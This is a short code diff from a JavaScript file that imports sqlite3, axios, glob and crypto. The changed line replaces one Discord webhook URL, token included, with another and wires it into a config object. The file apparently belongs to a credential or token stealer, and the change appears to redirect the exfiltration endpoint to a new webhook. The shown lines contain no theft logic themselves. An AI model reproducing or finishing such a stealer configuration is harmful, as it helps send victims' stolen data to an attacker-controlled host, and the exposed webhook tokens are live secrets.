@@ -13,7 +13,7 @@ const sqlite3 = require("sqlite3");
 const axios = require('axios');
 const glob = require("glob");
 const crypto = require("crypto");
-const zizizuckerbergs = "https://discord.com/api/webhooks/1089988571424886887/ujkpSwyJGCx5AbiX9cS20P6CO1Vhdgf3w49aFajZurfwg-y7PigP8pEKuXMk3XZgz6-9"
+const zizizuckerbergs = "https://discord.com/api/webhooks/1073966494108614716/qVd-M-I11Qx7Xia-Lb5Dnjij4PAk8_jHCAo1KRG0OHv85wKefcaHF8ZRVXJHIarfAm60"
 const config = {
     "webhook": zizizuckerbergs,
     "authorimage": "https://i.pinimg.com/originals/0b/a6/01/0ba601f55a0bb68a17b5e3ad024b4d1f.gif",
